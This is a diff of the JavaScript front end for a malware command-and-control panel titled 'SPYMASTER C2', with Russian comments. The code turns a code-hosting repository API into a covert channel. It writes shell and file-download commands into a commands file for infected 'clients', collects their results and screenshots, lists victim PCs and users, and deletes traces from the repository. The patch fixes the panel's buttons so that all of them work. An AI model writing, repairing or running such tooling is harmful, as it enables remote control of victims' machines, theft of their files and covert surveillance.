@@ -1,4 +1,4 @@
-// ============= SPYMASTER C2 PANEL - СТАБИЛЬНАЯ ВЕРСИЯ =============
+// ============= SPYMASTER C2 PANEL - РАБОЧАЯ ВЕРСИЯ (ВСЕ КНОПКИ) =============
 // АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
 
 // ============= КОНФИГУРАЦИЯ =============
@@ -49,6 +49,7 @@ let currentClient = "all";
 // ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
 function addLog(message, type = "system") {
     const logContainer = document.getElementById("logContainer");
+    if (!logContainer) return;
     const time = new Date().toLocaleTimeString();
     const logEntry = document.createElement("div");
     logEntry.className = `log-entry ${type}`;
@@ -79,107 +80,6 @@ function showNotification(message, type = "info") {
     setTimeout(() => notification.remove(), 3000);
 }
 
-// ============= ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ КОМАНД =============
-async function sendCommand(command, clientId = null) {
-    if (!command) return;
-    
-    const targetClient = clientId || currentClient || "all";
-    let finalCommand = command;
-    if (targetClient !== "all") {
-        finalCommand = `@${targetClient} ${command}`;
-    }
-    
-    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
-    showSendingIndicator(true);
-    
-    try {
-        // Отключаем кэширование
-        const cacheBuster = `?t=${Date.now()}&_=${Math.random()}`;
-        
-        // Получаем текущий commands.txt с актуальным SHA
-        let response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
-            headers: HEADERS,
-            cache: 'no-store'
-        });
-        
-        let currentContent = "";
-        let sha = null;
-        
-        if (response.status === 200) {
-            const data = await response.json();
-            currentContent = atob(data.content);
-            sha = data.sha;
-            addLog(`📖 ТЕКУЩИЙ SHA: ${sha.substring(0, 8)}...`, "system");
-        } else if (response.status === 404) {
-            addLog(`📝 ФАЙЛ commands.txt НЕ СУЩЕСТВУЕТ, СОЗДАЮ...`, "system");
-        } else {
-            addLog(`❌ ОШИБКА: ${response.status}`, "error");
-            showSendingIndicator(false);
-            return;
-        }
-        
-        // Добавляем команду с временной меткой
-        const newContent = currentContent + finalCommand + " #" + Date.now() + "\n";
-        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
-        
-        const putData = {
-            message: `Command: ${command}`,
-            content: encodedContent,
-            branch: "main"
-        };
-        if (sha) putData.sha = sha;
-        
-        // Отправляем с повторными попытками
-        let success = false;
-        for (let attempt = 1; attempt <= 3; attempt++) {
-            try {
-                const putResponse = await fetch(`${API_URL}/commands.txt`, {
-                    method: "PUT",
-                    headers: HEADERS,
-                    body: JSON.stringify(putData)
-                });
-                
-                if (putResponse.status === 200 || putResponse.status === 201) {
-                    addLog(`✅ КОМАНДА ОТПРАВЛЕНА! (попытка ${attempt})`, "success");
-                    showNotification(`✅ Команда отправлена: ${command}`, "success");
-                    success = true;
-                    break;
-                } else if (putResponse.status === 409) {
-                    addLog(`⚠️ КОНФЛИКТ (409), ОБНОВЛЯЮ SHA... (попытка ${attempt})`, "warning");
-                    // Получаем свежий SHA
-                    const freshResponse = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
-                        headers: HEADERS,
-                        cache: 'no-store'
-                    });
-                    if (freshResponse.status === 200) {
-                        const freshData = await freshResponse.json();
-                        putData.sha = freshData.sha;
-                        continue;
-                    }
-                } else {
-                    addLog(`❌ ОШИБКА: ${putResponse.status} (попытка ${attempt})`, "error");
-                }
-            } catch (err) {
-                addLog(`⚠️ ОШИБКА: ${err.message} (попытка ${attempt})`, "error");
-            }
-            
-            if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
-        }
-        
-        if (!success) {
-            addLog(`❌ НЕ УДАЛОСЬ ОТПРАВИТЬ КОМАНДУ ПОСЛЕ 3 ПОПЫТОК`, "error");
-            showNotification(`❌ Ошибка отправки: ${command}`, "error");
-        }
-        
-    } catch (error) {
-        addLog(`❌ КРИТИЧЕСКАЯ ОШИБКА: ${error.message}`, "error");
-        showNotification(`❌ Ошибка: ${error.message}`, "error");
-    }
-    
-    showSendingIndicator(false);
-}
-
-// ============= ИНДИКАТОР ОТПРАВКИ =============
 function showSendingIndicator(show) {
     let indicator = document.getElementById("sendingIndicator");
     if (!indicator) {
@@ -204,6 +104,95 @@ function showSendingIndicator(show) {
     indicator.style.display = show ? "block" : "none";
 }
 
+// ============= ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ КОМАНД =============
+async function sendCommand(command, clientId = null) {
+    if (!command) return;
+    
+    const targetClient = clientId || currentClient || "all";
+    let finalCommand = command;
+    if (targetClient !== "all") {
+        finalCommand = `@${targetClient} ${command}`;
+    }
+    
+    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
+    showSendingIndicator(true);
+    
+    try {
+        const cacheBuster = `?t=${Date.now()}&_=${Math.random()}`;
+        
+        let response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
+            headers: HEADERS,
+            cache: 'no-store'
+        });
+        
+        let currentContent = "";
+        let sha = null;
+        
+        if (response.status === 200) {
+            const data = await response.json();
+            currentContent = atob(data.content);
+            sha = data.sha;
+        } else if (response.status === 404) {
+            addLog(`📝 СОЗДАЮ commands.txt...`, "system");
+        } else {
+            addLog(`❌ ОШИБКА: ${response.status}`, "error");
+            showSendingIndicator(false);
+            return;
+        }
+        
+        const newContent = currentContent + finalCommand + " #" + Date.now() + "\n";
+        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
+        
+        const putData = {
+            message: `Command: ${command}`,
+            content: encodedContent,
+            branch: "main"
+        };
+        if (sha) putData.sha = sha;
+        
+        let success = false;
+        for (let attempt = 1; attempt <= 3; attempt++) {
+            try {
+                const putResponse = await fetch(`${API_URL}/commands.txt`, {
+                    method: "PUT",
+                    headers: HEADERS,
+                    body: JSON.stringify(putData)
+                });
+                
+                if (putResponse.status === 200 || putResponse.status === 201) {
+                    addLog(`✅ ОТПРАВЛЕНО! (${attempt})`, "success");
+                    showNotification(`✅ ${command}`, "success");
+                    success = true;
+                    break;
+                } else if (putResponse.status === 409) {
+                    addLog(`⚠️ КОНФЛИКТ, ПОВТОР... (${attempt})`, "warning");
+                    const freshResponse = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
+                        headers: HEADERS,
+                        cache: 'no-store'
+                    });
+                    if (freshResponse.status === 200) {
+                        const freshData = await freshResponse.json();
+                        putData.sha = freshData.sha;
+                        continue;
+                    }
+                }
+            } catch (err) {
+                addLog(`⚠️ ОШИБКА: ${err.message} (${attempt})`, "error");
+            }
+            if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
+        }
+        
+        if (!success) {
+            addLog(`❌ НЕ УДАЛОСЬ ОТПРАВИТЬ`, "error");
+        }
+        
+    } catch (error) {
+        addLog(`❌ ОШИБКА: ${error.message}`, "error");
+    }
+    
+    showSendingIndicator(false);
+}
+
 // ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
 async function loadResults() {
     try {
@@ -217,11 +206,13 @@ async function loadResults() {
         const results = files.filter(f => f.name.startsWith("result_"));
         const screenshots = files.filter(f => f.name.startsWith("screenshot_"));
         
-        document.getElementById("resultsCount").innerText = results.length;
-        document.getElementById("screensCount").innerText = screenshots.length;
-        document.getElementById("clientsCount").innerText = clients.length;
+        const resultsCount = document.getElementById("resultsCount");
+        const screensCount = document.getElementById("screensCount");
+        const clientsCount = document.getElementById("clientsCount");
+        if (resultsCount) resultsCount.innerText = results.length;
+        if (screensCount) screensCount.innerText = screenshots.length;
+        if (clientsCount) clientsCount.innerText = clients.length;
         
-        // Обрабатываем новые результаты
         for (const file of results) {
             if (!seenFiles.includes(file.name)) {
                 seenFiles.push(file.name);
@@ -232,7 +223,6 @@ async function loadResults() {
                     if (line.trim()) addLog(`   ${line.substring(0, 100)}`, "result");
                 }
                 
-                // Парсим нового клиента
                 if (content.includes("PC:")) {
                     const pcMatch = content.match(/PC:\s*([^\n]+)/);
                     const userMatch = content.match(/User:\s*([^\n]+)/);
@@ -249,7 +239,6 @@ async function loadResults() {
             }
         }
         
-        // Обновляем скриншоты
         const grid = document.getElementById("screensGrid");
         if (grid && screenshots.length > 0) {
             grid.innerHTML = "";
@@ -307,8 +296,10 @@ async function testConnection() {
         if (response.ok) {
             const user = await response.json();
             addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
-            document.getElementById("statusIndicator").classList.add("online");
-            document.getElementById("statusText").innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
+            const indicator = document.getElementById("statusIndicator");
+            const statusText = document.getElementById("statusText");
+            if (indicator) indicator.classList.add("online");
+            if (statusText) statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
             return true;
         } else {
             addLog(`❌ ОШИБКА: ${response.status}`, "error");
@@ -323,11 +314,11 @@ async function testConnection() {
 function startAutoRefresh() {
     if (autoRefresh) clearInterval(autoRefresh);
     autoRefresh = setInterval(() => loadResults(), 8000);
-    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (8 сек)", "system");
+    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО", "system");
 }
 
 // ============= ИНИЦИАЛИЗАЦИЯ =============
-async function init() {
+function init() {
     addLog("🐀 SPYMASTER C2 PANEL v5.0", "system");
     addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
     
@@ -343,47 +334,159 @@ async function init() {
             .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
             .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
             .log-entry { background: #0a0e27; border-radius: 3px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
+            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 5px; overflow: hidden; background: #0a0e27; }
+            .client-card { cursor: pointer; }
         `;
         document.head.appendChild(style);
     }
     
-    await testConnection();
+    testConnection();
     startAutoRefresh();
-    await loadResults();
+    loadResults();
     
-    // Привязываем кнопки
-    document.querySelectorAll(".cmd-btn, .cmd-small").forEach(btn => {
-        if (btn.id !== "sendCustomBtn" && btn.id !== "downloadBtn" && btn.id !== "shellBtn") {
-            btn.addEventListener("click", () => {
-                const cmd = btn.getAttribute("data-cmd");
-                if (cmd) sendCommand(cmd);
-            });
-        }
+    // ============= ПРИВЯЗКА ВСЕХ КНОПОК (ГЛАВНОЕ ИСПРАВЛЕНИЕ) =============
+    
+    // 1. Кнопки быстрых команд (.cmd-btn)
+    document.querySelectorAll('.cmd-btn').forEach(btn => {
+        btn.removeEventListener('click', btn._handler);
+        btn._handler = () => {
+            const cmd = btn.getAttribute('data-cmd');
+            if (cmd) sendCommand(cmd);
+        };
+        btn.addEventListener('click', btn._handler);
     });
     
-    document.getElementById("sendCustomBtn")?.addEventListener("click", () => {
-        const cmd = document.getElementById("customCmd")?.value;
-        if (cmd) sendCommand(cmd);
-        if (document.getElementById("customCmd")) document.getElementById("customCmd").value = "";
+    // 2. Маленькие кнопки (.cmd-small)
+    document.querySelectorAll('.cmd-small').forEach(btn => {
+        if (btn.id === 'sendCustomBtn' || btn.id === 'downloadBtn' || btn.id === 'shellBtn') return;
+        btn.removeEventListener('click', btn._handler);
+        btn._handler = () => {
+            const cmd = btn.getAttribute('data-cmd');
+            if (cmd) sendCommand(cmd);
+        };
+        btn.addEventListener('click', btn._handler);
     });
     
-    document.getElementById("downloadBtn")?.addEventListener("click", () => {
-        const path = document.getElementById("downloadPath")?.value;
-        if (path) sendCommand(`/download ${path}`);
+    // 3. Кнопка отправки кастомной команды
+    const sendCustomBtn = document.getElementById('sendCustomBtn');
+    if (sendCustomBtn) {
+        sendCustomBtn.removeEventListener('click', sendCustomBtn._handler);
+        sendCustomBtn._handler = () => {
+            const input = document.getElementById('customCmd');
+            if (input && input.value) {
+                sendCommand(input.value);
+                input.value = '';
+            }
+        };
+        sendCustomBtn.addEventListener('click', sendCustomBtn._handler);
+    }
+    
+    // 4. Кнопка Download
+    const downloadBtn = document.getElementById('downloadBtn');
+    if (downloadBtn) {
+        downloadBtn.removeEventListener('click', downloadBtn._handler);
+        downloadBtn._handler = () => {
+            const input = document.getElementById('downloadPath');
+            if (input && input.value) {
+                sendCommand(`/download ${input.value}`);
+            }
+        };
+        downloadBtn.addEventListener('click', downloadBtn._handler);
+    }
+    
+    // 5. Кнопка Shell
+    const shellBtn = document.getElementById('shellBtn');
+    if (shellBtn) {
+        shellBtn.removeEventListener('click', shellBtn._handler);
+        shellBtn._handler = () => {
+            const input = document.getElementById('shellCmd');
+            if (input && input.value) {
+                sendCommand(`/cmd ${input.value}`);
+            }
+        };
+        shellBtn.addEventListener('click', shellBtn._handler);
+    }
+    
+    // 6. Кнопка очистки команд
+    const clearBtn = document.getElementById('clearCommandsBtn');
+    if (clearBtn) {
+        clearBtn.removeEventListener('click', clearBtn._handler);
+        clearBtn._handler = () => clearCommands();
+        clearBtn.addEventListener('click', clearBtn._handler);
+    }
+    
+    // 7. Кнопка обновления
+    const refreshBtn = document.getElementById('refreshBtn');
+    if (refreshBtn) {
+        refreshBtn.removeEventListener('click', refreshBtn._handler);
+        refreshBtn._handler = () => {
+            loadResults();
+            addLog("🔄 ОБНОВЛЕНО", "system");
+        };
+        refreshBtn.addEventListener('click', refreshBtn._handler);
+    }
+    
+    // 8. Кнопка очистки всего
+    const clearAllBtn = document.getElementById('clearAllBtn');
+    if (clearAllBtn) {
+        clearAllBtn.removeEventListener('click', clearAllBtn._handler);
+        clearAllBtn._handler = () => {
+            if (confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) {
+                addLog("💣 ОЧИСТКА РЕПОЗИТОРИЯ...", "system");
+                // Функция очистки
+                (async () => {
+                    const response = await fetch(`${API_URL}?t=${Date.now()}`, { headers: HEADERS });
+                    if (response.ok) {
+                        const files = await response.json();
+                        const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
+                        let deleted = 0;
+                        for (const file of files) {
+                            if (protectedFiles.includes(file.name)) continue;
+                            await fetch(`${API_URL}/${file.name}`, {
+                                method: "DELETE",
+                                headers: HEADERS,
+                                body: JSON.stringify({ message: "Delete", sha: file.sha, branch: "main" })
+                            });
+                            deleted++;
+                            await new Promise(r => setTimeout(r, 100));
+                        }
+                        addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success");
+                        seenFiles = [];
+                        clients = [];
+                        loadResults();
+                    }
+                })();
+            }
+        };
+        clearAllBtn.addEventListener('click', clearAllBtn._handler);
+    }
+    
+    // 9. Выбор клиента
+    const clientSelect = document.getElementById('clientSelect');
+    if (clientSelect) {
+        clientSelect.removeEventListener('change', clientSelect._handler);
+        clientSelect._handler = (e) => {
+            currentClient = e.target.value;
+            addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
+        };
+        clientSelect.addEventListener('change', clientSelect._handler);
+    }
+    
+    // 10. Вкладки
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.removeEventListener('click', btn._handler);
+        btn._handler = () => {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            btn.classList.add('active');
+            const tabId = `${btn.getAttribute('data-tab')}Tab`;
+            const tabContent = document.getElementById(tabId);
+            if (tabContent) tabContent.classList.add('active');
+        };
+        btn.addEventListener('click', btn._handler);
     });
     
-    document.getElementById("shellBtn")?.addEventListener("click", () => {
-        const cmd = document.getElementById("shellCmd")?.value;
-        if (cmd) sendCommand(`/cmd ${cmd}`);
-    });
-    
-    document.getElementById("clearCommandsBtn")?.addEventListener("click", clearCommands);
-    document.getElementById("refreshBtn")?.addEventListener("click", () => loadResults());
-    
-    document.getElementById("clientSelect")?.addEventListener("change", (e) => {
-        currentClient = e.target.value;
-        addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
-    });
+    addLog("✅ ИНТЕРФЕЙС ЗАГРУЖЕН, ВСЕ КНОПКИ АКТИВНЫ", "success");
 }
 
 // Запуск
